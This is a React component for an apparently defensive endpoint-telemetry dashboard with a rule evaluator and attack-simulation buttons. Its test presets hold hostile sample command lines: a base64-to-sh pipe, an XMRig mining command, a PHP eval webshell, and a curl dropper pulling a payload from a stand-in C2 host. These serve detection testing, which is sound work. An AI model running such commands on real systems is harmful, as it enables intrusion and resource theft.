import { useState, useEffect, useMemo } from "react";
import { invoke } from "../lib/ipc/core";
import { listen } from "../lib/ipc/event";
import type { TelemetryEvent, Severity } from "../types";

export default function TelemetryLogPanel() {
  const [telemetry, setTelemetry] = useState<TelemetryEvent[]>([]);
  const [search, setSearch] = useState("");
  const [severityFilter, setSeverityFilter] = useState<Severity | "all">("all");
  const [verdictFilter, setVerdictFilter] = useState<"all" | "alert" | "monitored" | "suppressed" | "clean">("all");
  const [expandedId, setExpandedId] = useState<string | null>(null);

  // Live Evaluator state
  const [showEvaluator, setShowEvaluator] = useState(false);
  const [evalProcess, setEvalProcess] = useState("curl");
  const [evalParent, setEvalParent] = useState("bash");
  const [evalCmd, setEvalCmd] = useState("curl -fsSL https://registry.npmjs.org/express");
  const [evalUid, setEvalUid] = useState("1000");
  const [evalDestination, setEvalDestination] = useState("registry.npmjs.org");
  const [evalResult, setEvalResult] = useState<any | null>(null);
  const [evaluating, setEvaluating] = useState(false);
  const [scenarioNotice, setScenarioNotice] = useState<string | null>(null);

  // Fetch initial telemetry
  useEffect(() => {
    invoke<TelemetryEvent[]>("list_telemetry", { limit: 120 })
      .then((res) => {
        if (Array.isArray(res)) setTelemetry(res);
      })
      .catch((err) => console.error("Failed to load telemetry:", err));

    const unlistenPromise = listen<TelemetryEvent>("telemetry-event", (event) => {
      setTelemetry((prev) => [event.payload, ...prev]);
    });

    return () => {
      unlistenPromise.then((unlisten) => unlisten());
    };
  }, []);

  const runScenario = async (scenario: string) => {
    setScenarioNotice(null);
    try {
      const res = await invoke<any>("simulate_movement_scenario", { scenario });
      if (res && res.message) {
        setScenarioNotice(res.message);
        // Refresh telemetry list
        const updated = await invoke<TelemetryEvent[]>("list_telemetry", { limit: 120 });
        if (Array.isArray(updated)) setTelemetry(updated);
      }
    } catch (err) {
      console.error("Scenario execution error:", err);
    }
  };

  const runEvaluator = async () => {
    setEvaluating(true);
    try {
      const res = await invoke<any>("evaluate_command", {
        process_name: evalProcess.trim(),
        parent_name: evalParent.trim(),
        cmdline: evalCmd.trim().split(" "),
        uid: parseInt(evalUid, 10) || 1000,
        destination: evalDestination.trim(),
      });
      setEvalResult(res);
    } catch (err) {
      console.error("Evaluation failed:", err);
    } finally {
      setEvaluating(false);
    }
  };

  const filteredEvents = useMemo(() => {
    return telemetry.filter((ev) => {
      if (severityFilter !== "all" && ev.severity !== severityFilter) return false;
      if (verdictFilter !== "all" && ev.verdict !== verdictFilter) return false;
      if (search) {
        const q = search.toLowerCase();
        const matchesName = ev.process.toLowerCase().includes(q);
        const matchesParent = ev.parent.toLowerCase().includes(q);
        const matchesDetail = ev.detail.toLowerCase().includes(q);
        const matchesMitre = (ev.mitre || "").toLowerCase().includes(q);
        const matchesCmd = (ev.cmdline || []).join(" ").toLowerCase().includes(q);
        return matchesName || matchesParent || matchesDetail || matchesMitre || matchesCmd;
      }
      return true;
    });
  }, [telemetry, severityFilter, verdictFilter, search]);

  return (
    <div className="panel">
      {/* Panel Header */}
      <div className="panel-header">
        <span className="panel-title">INTERNAL MOVEMENTS & TELEMETRY STREAM</span>
        <span className="pstat">{telemetry.length} EVENTS RECORDED</span>
        <span className="pstat" style={{ color: "var(--teall)", borderColor: "var(--teal)" }}>
          AUTO-TUNING FP FILTER ACTIVE
        </span>

        <div className="toolbar-right">
          <button
            className={`sm-btn ${showEvaluator ? "sm-btn--active" : ""}`}
            onClick={() => setShowEvaluator(!showEvaluator)}
            title="Interactive Rule & Risk Scoring Evaluator"
          >
            ⚙ RULE EVALUATOR
          </button>

          <input
            className="search-input"
            type="text"
            placeholder="Search movements, PIDs, MITRE, cmd..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
        </div>
      </div>

      {/* Scenario Simulation & Injection Bar */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          gap: 8,
          padding: "6px 14px",
          background: "var(--bg2)",
          borderBottom: "1px solid var(--border)",
          flexWrap: "wrap",
        }}
      >
        <span style={{ fontSize: 9, color: "var(--tx2)", letterSpacing: "0.08em", fontWeight: 700 }}>
          TEST ENGINE SCENARIOS:
        </span>

        <button
          className="sm-btn"
          onClick={() => runScenario("benign_dev")}
          title="Verify developer build tools are suppressed and NOT falsely marked High/Critical"
        >
          ✓ Test Benign Dev Tool (npm / curl)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("admin_audit")}
          title="Verify administrative diagnostic shell sessions are clean"
        >
          ✓ Test Admin Diagnostics (ps / sshd)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("suspicious_script")}
          title="Verify ambiguous script is properly tiered as MEDIUM (no false critical)"
        >
          ⚠ Test Base64 Script (Medium Tier)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("virus_attack")}
          title="Verify Anti-Virus heuristics detect malicious miners, webshells, or trojans"
          style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
        >
          ⚡ Test Virus (XMRig Miner)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("ransomware_attack")}
          title="Verify high-entropy volume encryption is trapped and flagged with MAL-RANSOM-DEADBOLT"
          style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
        >
          ⚡ Test Ransomware (DeadBolt)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("rootkit_attack")}
          title="Verify kernel module injection and syscall detours are detected"
          style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
        >
          ⚡ Test Rootkit (Diamorphine LKM)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("webshell_attack")}
          title="Verify web server child eval injection is trapped"
          style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
        >
          ⚡ Test WebShell (C99 RCE)
        </button>

        <button
          className="sm-btn"
          onClick={() => runScenario("multi_stage_c2")}
          title="Verify genuine multi-stage attack triggers CRITICAL alert"
          style={{ borderColor: "rgba(220,38,38,.4)", color: "var(--redl)" }}
        >
          ⚡ Test Multi-Stage C2 Dropper (Critical)
        </button>
      </div>

      {/* Scenario Notice Banner */}
      {scenarioNotice && (
        <div
          style={{
            padding: "8px 14px",
            background: "rgba(124,58,237,.08)",
            borderBottom: "1px solid var(--vd)",
            color: "var(--vl)",
            fontSize: 10,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <span>◈ {scenarioNotice}</span>
          <button
            onClick={() => setScenarioNotice(null)}
            style={{ color: "var(--tx2)", fontSize: 11, cursor: "pointer" }}
          >
            ✕
          </button>
        </div>
      )}

      {/* Interactive Live Rule Evaluator Drawer */}
      {showEvaluator && (
        <div
          style={{
            padding: "12px 16px",
            background: "var(--bg1)",
            borderBottom: "1px solid var(--border2)",
            display: "flex",
            flexDirection: "column",
            gap: 10,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "var(--vl)", letterSpacing: "0.08em" }}>
              LIVE DETECTION & SCORING EVALUATOR (FALSE-POSITIVE & ESCALATION TESTER)
            </span>
            <span style={{ fontSize: 9, color: "var(--tx2)" }}>
              Test how the internal engine scores any process, lineage, or command line without modifying live state.
            </span>
          </div>

          {/* Presets Bar */}
          <div style={{ display: "flex", gap: 6, flexWrap: "wrap", alignItems: "center" }}>
            <span style={{ fontSize: 8, color: "var(--tx2)", fontWeight: 700, letterSpacing: "0.06em" }}>
              QUICK TEST PRESETS:
            </span>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("npm");
                setEvalParent("bash");
                setEvalCmd("npm install --save express");
                setEvalUid("1000");
                setEvalDestination("registry.npmjs.org");
              }}
            >
              ✓ Benign Dev: npm
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("ps");
                setEvalParent("bash");
                setEvalCmd("ps aux | grep root");
                setEvalUid("1000");
                setEvalDestination("");
              }}
            >
              ✓ Benign Admin: ps aux
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("bash");
                setEvalParent("cron");
                setEvalCmd("echo 'c2NyaXB0' | base64 -d | sh");
                setEvalUid("1000");
                setEvalDestination("");
              }}
            >
              ⚠ Medium: base64 pipe
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("xmrig");
                setEvalParent("bash");
                setEvalCmd("/usr/local/bin/xmrig -o stratum+tcp://pool.minexmr.com:4444");
                setEvalUid("1000");
                setEvalDestination("pool.minexmr.com");
              }}
              style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
            >
              ⚡ Virus: XMRig Miner
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("php");
                setEvalParent("nginx");
                setEvalCmd("php -r '@eval(base64_decode($_POST[\"c99sh\"]));'");
                setEvalUid("33");
                setEvalDestination("");
              }}
              style={{ borderColor: "rgba(220,38,38,.5)", color: "var(--redl)" }}
            >
              ⚡ Virus: C99 WebShell
            </button>
            <button
              className="sm-btn"
              onClick={() => {
                setEvalProcess("curl");
                setEvalParent("nginx");
                setEvalCmd("curl -fsSL http://cobalt-strike.bad/stage.bin -o /dev/shm/.kworker");
                setEvalUid("33");
                setEvalDestination("cobalt-strike.bad");
              }}
              style={{ borderColor: "rgba(220,38,38,.7)", color: "var(--redl)" }}
            >
              ⚡ Critical: C2 Dropper
            </button>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "120px 120px 70px 1fr 180px auto", gap: 8, alignItems: "center" }}>
            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>PROCESS</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalProcess}
                onChange={(e) => setEvalProcess(e.target.value)}
                placeholder="e.g. curl, python3, bash"
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>PARENT PROCESS</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalParent}
                onChange={(e) => setEvalParent(e.target.value)}
                placeholder="e.g. nginx, sshd, bash"
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>UID</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalUid}
                onChange={(e) => setEvalUid(e.target.value)}
                placeholder="1000"
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>COMMAND LINE</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalCmd}
                onChange={(e) => setEvalCmd(e.target.value)}
                placeholder="Full command string..."
              />
            </div>

            <div>
              <label style={{ display: "block", fontSize: 8, color: "var(--tx2)", marginBottom: 2 }}>DESTINATION HOST / IP</label>
              <input
                className="challenge-input"
                style={{ fontSize: 10, padding: "4px 8px" }}
                value={evalDestination}
                onChange={(e) => setEvalDestination(e.target.value)}
                placeholder="e.g. registry.npmjs.org"
              />
            </div>

            <div style={{ paddingTop: 14 }}>
              <button
                className="action-btn"
                onClick={runEvaluator}
                disabled={evaluating}
                style={{ height: 28, padding: "0 14px" }}
              >
                {evaluating ? "EVALUATING…" : "EVALUATE"}
              </button>
            </div>
          </div>

          {/* Evaluation Outcome */}
          {evalResult && (
            <div
              style={{
                marginTop: 6,
                padding: "10px 14px",
                background: "var(--bg3)",
                border: "1px solid var(--border)",
                borderRadius: 4,
                display: "flex",
                flexDirection: "column",
                gap: 6,
              }}
            >
              {/* Virus Alert Box */}
              {evalResult.virus_match && (
                <div
                  style={{
                    padding: "6px 10px",
                    background: "rgba(220,38,38,.18)",
                    border: "1px solid var(--red)",
                    borderRadius: 3,
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ fontSize: 10, fontWeight: 800, color: "var(--redl)" }}>
                      ⚡ VIRUS SIGNATURE IDENTIFIED:
                    </span>
                    <strong style={{ fontSize: 11, color: "var(--tx0)" }}>
                      {evalResult.virus_match.name}
                    </strong>
                  </div>
                  <span
                    style={{
                      fontSize: 8,
                      fontWeight: 700,
                      padding: "1px 6px",
                      borderRadius: 2,
                      background: "rgba(220,38,38,.3)",
                      color: "var(--redl)",
                    }}
                  >
                    FAMILY: {evalResult.virus_match.family}
                  </span>
                </div>
              )}

              <div style={{ display: "flex", alignItems: "center", gap: 10, flexWrap: "wrap" }}>
                <span
                  style={{
                    fontSize: 12,
                    fontWeight: 700,
                    padding: "2px 8px",
                    borderRadius: 3,
                    background:
                      evalResult.score >= 90
                        ? "rgba(220,38,38,.2)"
                        : evalResult.score >= 70
                        ? "rgba(234,88,12,.2)"
                        : evalResult.score >= 45
                        ? "rgba(217,119,6,.2)"
                        : "rgba(13,148,136,.2)",
                    color:
                      evalResult.score >= 90
                        ? "var(--redl)"
                        : evalResult.score >= 70
                        ? "#fb923c"
                        : evalResult.score >= 45
                        ? "var(--amberl)"
                        : "var(--teall)",
                    border: "1px solid currentColor",
                  }}
                >
                  RISK SCORE: {evalResult.score}/100 [{evalResult.severity.toUpperCase()}]
                </span>

                {/* Calibrated Rule Pill */}
                {evalResult.rule && (
                  <span
                    style={{
                      fontSize: 9,
                      fontWeight: 700,
                      fontFamily: "var(--mono)",
                      padding: "2px 8px",
                      borderRadius: 3,
                      background: "var(--bg1)",
                      color: "var(--tx0)",
                      border: "1px solid var(--border2)",
                    }}
                  >
                    RULE: {evalResult.rule}
                  </span>
                )}

                <span
                  style={{
                    fontSize: 9,
                    fontWeight: 700,
                    padding: "2px 8px",
                    borderRadius: 3,
                    background:
                      evalResult.verdict === "alert"
                        ? "rgba(220,38,38,.15)"
                        : evalResult.verdict === "monitored"
                        ? "rgba(217,119,6,.15)"
                        : evalResult.verdict === "suppressed"
                        ? "rgba(124,58,237,.15)"
                        : "rgba(13,148,136,.15)",
                    color:
                      evalResult.verdict === "alert"
                        ? "var(--redl)"
                        : evalResult.verdict === "monitored"
                        ? "var(--amberl)"
                        : evalResult.verdict === "suppressed"
                        ? "var(--vl)"
                        : "var(--teall)",
                    letterSpacing: "0.06em",
                  }}
                >
                  VERDICT: {evalResult.verdict.toUpperCase()}
                </span>

                <span style={{ fontSize: 10, color: "var(--tx1)" }}>
                  MITRE: <strong>{evalResult.mitre_tactic}</strong> ➔ {evalResult.mitre_technique}
                </span>
              </div>

              {/* Movement Flags */}
              {evalResult.flags && evalResult.flags.length > 0 && (
                <div style={{ display: "flex", gap: 5, flexWrap: "wrap", alignItems: "center" }}>
                  <span style={{ fontSize: 8, color: "var(--tx2)", fontWeight: 700 }}>FLAGS:</span>
                  {evalResult.flags.map((fl: string, i: number) => (
                    <span
                      key={i}
                      style={{
                        fontSize: 8,
                        fontFamily: "var(--mono)",
                        padding: "1px 5px",
                        borderRadius: 2,
                        background: fl.includes("VIRUS")
                          ? "rgba(220,38,38,.2)"
                          : fl.includes("DEV") || fl.includes("DIAG")
                          ? "rgba(13,148,136,.2)"
                          : "rgba(124,58,237,.15)",
                        color: fl.includes("VIRUS")
                          ? "var(--redl)"
                          : fl.includes("DEV") || fl.includes("DIAG")
                          ? "var(--teall)"
                          : "var(--vl)",
                        border: "1px solid currentColor",
                      }}
                    >
                      {fl}
                    </span>
                  ))}
                </div>
              )}

              <div style={{ fontSize: 10, color: "var(--tx1)", lineHeight: 1.5 }}>
                {evalResult.explanation}
              </div>

              {evalResult.factors && evalResult.factors.length > 0 && (
                <div style={{ marginTop: 4 }}>
                  <span style={{ fontSize: 8, color: "var(--tx2)", letterSpacing: "0.08em", fontWeight: 700 }}>
                    FACTOR BREAKDOWN:
                  </span>
                  <div style={{ display: "flex", flexDirection: "column", gap: 3, marginTop: 4 }}>
                    {evalResult.factors.map((f: any, i: number) => (
                      <div
                        key={i}
                        style={{
                          fontSize: 9,
                          display: "flex",
                          alignItems: "center",
                          gap: 8,
                          color: f.impact > 0 ? "var(--tx0)" : "var(--teall)",
                        }}
                      >
                        <span
                          style={{
                            fontWeight: 700,
                            minWidth: 40,
                            color: f.impact > 0 ? (f.impact >= 35 ? "var(--redl)" : "var(--amberl)") : "var(--teall)",
                          }}
                        >
                          {f.impact > 0 ? `+${f.impact}` : f.impact} pts
                        </span>
                        <strong style={{ minWidth: 160 }}>{f.name}:</strong>
                        <span style={{ color: "var(--tx1)" }}>{f.desc}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Filter Tabs Bar */}
      <div className="cat-tabs" style={{ display: "flex", justifyContent: "space-between" }}>
        <div style={{ display: "flex", gap: 2 }}>
          {(["all", "alert", "monitored", "suppressed", "clean"] as const).map((v) => (
            <div
              key={v}
              className={`cat-tab ${verdictFilter === v ? "cat-tab--active" : ""}`}
              onClick={() => setVerdictFilter(v)}
            >
              {v.toUpperCase()}
              <span className="cat-tab-count">
                {v === "all" ? telemetry.length : telemetry.filter((t) => t.verdict === v).length}
              </span>
            </div>
          ))}
        </div>

        <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
          <span style={{ fontSize: 9, color: "var(--tx2)", letterSpacing: "0.06em" }}>SEVERITY:</span>
          {(["all", "critical", "high", "medium", "low", "informational"] as const).map((s) => (
            <button
              key={s}
              className={`sm-btn ${severityFilter === s ? "sm-btn--active" : ""}`}
              onClick={() => setSeverityFilter(s)}
              style={{ fontSize: 8, padding: "2px 6px" }}
            >
              {s.toUpperCase()}
            </button>
          ))}
        </div>
      </div>

      {/* Table Header */}
      <div
        style={{
          display: "grid",
          gridTemplateColumns: "70px 100px 180px 110px 100px 1fr 24px",
          padding: "5px 14px",
          fontSize: 9,
          color: "var(--tx2)",
          letterSpacing: "0.08em",
          textTransform: "uppercase",
          borderBottom: "1px solid var(--border)",
          background: "var(--bg1)",
          flexShrink: 0,
        }}
      >
        <span>TIME</span>
        <span>EVENT TYPE</span>
        <span>LINEAGE (PARENT ➔ PROC)</span>
        <span>RISK SCORE</span>
        <span>VERDICT</span>
        <span>DETAIL & TELEMETRY NOTES</span>
        <span></span>
      </div>

      {/* Telemetry Event Stream */}
      <div className="journal-list">
        {filteredEvents.length === 0 ? (
          <div className="empty-state">
            <div className="empty-icon">☵</div>
            <div>NO TELEMETRY EVENTS MATCHING FILTER</div>
          </div>
        ) : (
          filteredEvents.map((ev) => {
            const isExpanded = expandedId === ev.id;
            const timeStr = new Date(ev.ts).toLocaleTimeString("en-GB", { hour12: false });

            let verdictColor = "var(--teall)";
            let verdictBg = "rgba(13,148,136,.15)";
            let verdictBorder = "var(--teal)";

            if (ev.verdict === "alert") {
              verdictColor = "var(--redl)";
              verdictBg = "rgba(220,38,38,.18)";
              verdictBorder = "var(--red)";
            } else if (ev.verdict === "monitored") {
              verdictColor = "var(--amberl)";
              verdictBg = "rgba(217,119,6,.18)";
              verdictBorder = "var(--amber)";
            } else if (ev.verdict === "suppressed") {
              verdictColor = "var(--vl)";
              verdictBg = "rgba(124,58,237,.18)";
              verdictBorder = "var(--vd)";
            }

            return (
              <div
                key={ev.id}
                style={{
                  borderBottom: "1px solid rgba(37,37,50,.55)",
                  background: isExpanded ? "var(--bg3)" : "transparent",
                  borderLeft:
                    ev.verdict === "alert"
                      ? "2px solid var(--red)"
                      : ev.verdict === "monitored"
                      ? "2px solid var(--amber)"
                      : ev.verdict === "suppressed"
                      ? "2px solid var(--vl)"
                      : "2px solid transparent",
                }}
              >
                <div
                  style={{
                    display: "grid",
                    gridTemplateColumns: "70px 100px 180px 110px 100px 1fr 24px",
                    padding: "7px 14px",
                    alignItems: "center",
                    cursor: "pointer",
                    gap: 6,
                  }}
                  onClick={() => setExpandedId(isExpanded ? null : ev.id)}
                >
                  <span style={{ fontSize: 9, color: "var(--tx2)" }}>{timeStr}</span>

                  <span
                    style={{
                      fontSize: 8,
                      fontWeight: 700,
                      padding: "2px 5px",
                      borderRadius: 2,
                      background: "var(--bg4)",
                      color: "var(--tx1)",
                      border: "1px solid var(--border)",
                      textAlign: "center",
                      letterSpacing: "0.05em",
                    }}
                  >
                    {ev.event_type}
                  </span>

                  <span
                    style={{
                      fontSize: 10,
                      color: "var(--tx0)",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                    }}
                  >
                    <span style={{ color: "var(--tx2)" }}>{ev.parent}</span> ➔ <strong>{ev.process}</strong>
                    <span style={{ fontSize: 9, color: "var(--tx2)", marginLeft: 4 }}>[{ev.pid}]</span>
                  </span>

                  {/* Risk Score Meter */}
                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                    <div
                      style={{
                        width: 44,
                        height: 5,
                        background: "var(--bg4)",
                        borderRadius: 2,
                        overflow: "hidden",
                      }}
                    >
                      <div
                        style={{
                          height: "100%",
                          width: `${Math.max(ev.score, 4)}%`,
                          background:
                            ev.score >= 90
                              ? "var(--red)"
                              : ev.score >= 70
                              ? "var(--amberl)"
                              : ev.score >= 45
                              ? "var(--amber)"
                              : "var(--teal)",
                        }}
                      />
                    </div>
                    <span
                      style={{
                        fontSize: 9,
                        fontWeight: 700,
                        color:
                          ev.score >= 90
                            ? "var(--redl)"
                            : ev.score >= 70
                            ? "#fb923c"
                            : ev.score >= 45
                            ? "var(--amberl)"
                            : "var(--tx2)",
                      }}
                    >
                      {ev.score}
                    </span>
                  </div>

                  {/* Verdict Badge */}
                  <div>
                    <span
                      style={{
                        fontSize: 8,
                        fontWeight: 700,
                        padding: "1px 6px",
                        borderRadius: 2,
                        background: verdictBg,
                        color: verdictColor,
                        border: `1px solid ${verdictBorder}`,
                        letterSpacing: "0.04em",
                      }}
                    >
                      {ev.verdict.toUpperCase()}
                    </span>
                  </div>

                  <span
                    style={{
                      fontSize: 10,
                      color: ev.verdict === "alert" ? "var(--tx0)" : "var(--tx1)",
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                    }}
                  >
                    {ev.detail}
                  </span>

                  <span style={{ fontSize: 10, color: "var(--tx2)", textAlign: "center" }}>
                    {isExpanded ? "▲" : "▼"}
                  </span>
                </div>

                {/* Expanded Details */}
                {isExpanded && (
                  <div
                    style={{
                      padding: "8px 18px 12px 24px",
                      background: "rgba(7,7,10,.75)",
                      borderTop: "1px solid var(--border)",
                      display: "flex",
                      flexDirection: "column",
                      gap: 6,
                    }}
                  >
                    {ev.cmdline && ev.cmdline.length > 0 && (
                      <div className="meta-row">
                        <span className="meta-label">COMMAND</span>
                        <code className="meta-code" style={{ fontSize: 10 }}>
                          {ev.cmdline.join(" ")}
                        </code>
                      </div>
                    )}

                    {ev.mitre && (
                      <div className="meta-row">
                        <span className="meta-label">MITRE TACTIC</span>
                        <span style={{ fontSize: 10, color: "var(--vl)", fontWeight: 600 }}>{ev.mitre}</span>
                      </div>
                    )}

                    {ev.suppression_reason && (
                      <div
                        style={{
                          padding: "6px 10px",
                          background: "rgba(124,58,237,.06)",
                          borderLeft: "2px solid var(--vd)",
                          fontSize: 10,
                          color: "var(--vl)",
                          lineHeight: 1.5,
                        }}
                      >
                        <strong>Auto-Tuning Suppression Engine:</strong> {ev.suppression_reason}
                      </div>
                    )}

                    <div className="meta-row">
                      <span className="meta-label">PROCESS LINEAGE</span>
                      <span className="meta-val">
                        Parent PID: {ev.ppid} ({ev.parent}) ➔ Child PID: {ev.pid} ({ev.process})
                      </span>
                    </div>

                    <div className="meta-row">
                      <span className="meta-label">TIMESTAMP</span>
                      <span className="meta-val">{new Date(ev.ts).toISOString()}</span>
                    </div>
                  </div>
                )}
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
